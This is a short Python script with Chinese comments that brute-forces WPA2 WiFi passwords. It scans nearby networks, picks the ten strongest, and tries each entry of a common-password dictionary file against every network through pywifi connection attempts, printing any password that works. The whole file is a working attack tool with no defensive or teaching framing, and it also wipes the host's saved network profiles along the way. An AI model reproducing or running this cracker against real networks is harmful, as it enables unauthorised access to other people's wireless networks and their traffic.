import time  # 时间
import pywifi  # 破解wifi
from pywifi import const  # 引用一些定义


class PoJie():
    def __init__(self, path):
        self.file = open(path, "r", errors="ignore")
        wifi = pywifi.PyWiFi()  # 抓取网卡接口
        self.iface = wifi.interfaces()[0]  # 抓取第一个无限网卡
        self.iface.disconnect()  # 测试链接断开所有链接
        time.sleep(1)  # 休眠1秒
        self.list = self.initialssidnamelist()

        # 测试网卡是否属于断开状态，
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def bies(self):
        self.iface.scan()  # 扫描
        bessis = self.iface.scan_results()
        list = []
        for data in bessis:
            list.append((data.ssid, data.signal))
        return len(list), sorted(list, key=lambda st: st[1], reverse=True)

    def getsignal(self):
        while True:
            n, data = self.bies()
            time.sleep(1)
            if n is not 0:
                return data[0:10]

    def initialssidnamelist(self):
        ssidlist = self.getsignal()
        namelist = []
        for item in ssidlist:
            namelist.append(item[0])
        return namelist

    def readPassWord(self, ssidname, myStr):

        bool1 = self.test_connect(myStr, ssidname)
        if len(myStr) < 8:
            return False
        if bool1:
            print("密码+++++++++++++正确：" + myStr + "   " + ssidname)
            return True
        else:
            print("密码错误:" + myStr + "   " + ssidname)
            return False

    def test_connect(self, findStr, ssidname):  # 测试链接

        profile = pywifi.Profile()  # 创建wifi链接文件
        profile.ssid = ssidname  # wifi名称
        # profile.ssid ="Netcore" #wifi名称
        profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放，
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
        profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        profile.key = findStr  # 密码

        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件
        tmp_profile = self.iface.add_network_profile(profile)  # 设定新的链接文件
        self.iface.connect(tmp_profile)  # 链接
        time.sleep(2)
        if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上
            isOK = True
        else:
            isOK = False
        self.iface.disconnect()  # 断开
        time.sleep(1)
        # 检查断开状态
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return isOK

    def run(self):

        while True:
            myStr = self.file.readline()
            for ssidname in self.list:
                ret = self.readPassWord(ssidname, myStr)

                if ret:
                    raise FileExistsError

    def __del__(self):
        self.file.close()


path = r"G:\DownLoad\6000常用密码字典.txt"
start = PoJie(path)
start.run()
